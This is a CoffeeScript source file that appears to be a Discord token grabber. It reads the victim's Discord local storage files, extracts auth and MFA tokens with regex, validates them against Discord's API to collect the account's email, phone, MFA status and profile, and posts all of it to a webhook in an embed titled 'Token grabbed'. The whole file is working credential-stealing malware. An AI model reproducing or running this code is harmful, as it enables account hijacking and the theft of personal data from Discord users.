fs = require('fs')
request = require('request')
webhook = String('url')
files = []
r = []
fs.readdirSync(process.env.APPDATA + '/Discord/Local Storage/leveldb').forEach (e) ->
  f = undefined
  f = undefined
  if e.match(/.log|.ldb/)
    f = fs.readFileSync(process.env.APPDATA + '/Discord/Local Storage/leveldb' + '/' + e)
    files.push f.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/)
    files.push f.toString().match(/mfa\.[\w-]{84}/)
  return
files.forEach (i, m) ->
  if i == null
    files.splice m, 1
  else if typeof i
    i.forEach (ii) ->
      if ii != null
        r.push ii
      return
  return

req = (i) ->
  setting = undefined
  setting =
    headers:
      'Content-Type': 'application/json'
      'authorization': i
    method: 'get'
    url: 'https://discord.com/api/users/@me'
  request setting, (a, aa, bb) ->
    b = JSON.parse(bb)
    if b.code == 0
      return
    if b.code != 0 and b != undefined
      console.log b
      setting =
        headers: 'Content-Type': 'application/json'
        body: JSON.stringify(
          content: '@here'
          embeds: [ {
            title: 'Token grabbed'
            description: '\ntoken: ' + i + '\n**uuid:** ' + b.id + '\n**tag:** ' + b.username + '#' + b.discriminator + '\n**email:** ' + b.email + '\n**phone:** ' + b.phone + '\n**verified:** ' + b.verified + '\n**nsfw allowed:** ' + b.nsfw_allowed + '\n**a2f:** ' + b.mfa_enabled + '\n**locale:** ' + b.locale + '\n\n**Bio:**\n\n>>> ' + b.bio + '\n\n**banner:** '
            image:
              url: if b.banner then 'https://cdn.discordapp.com/banners/' + b.id + '/' + b.banner + '.gif?size=512' else 'https://opengraph.githubassets.com/f850eb781f9da1f039568f21ccdd40e9b9125bf45fbdd1ee386ea5a3363a35eb/NotPunchnox/discord-token-grabber'
              footer:
                url: 'https://cdn.discordapp.com/avatars/' + b.id + '/' + b.avatar + '.webp?size=2048'
                text: 'discord.gg/punchnox'
          } ]
          username: b.username
          avatar_url: 'https://cdn.discordapp.com/avatars/' + b.id + '/' + b.avatar + '.webp?size=2048')
        url: webhook
        method: 'POST'
      request setting, (a, aa, body) ->
        console.log body
        return
    return

r.forEach (i) ->
  req i
  return
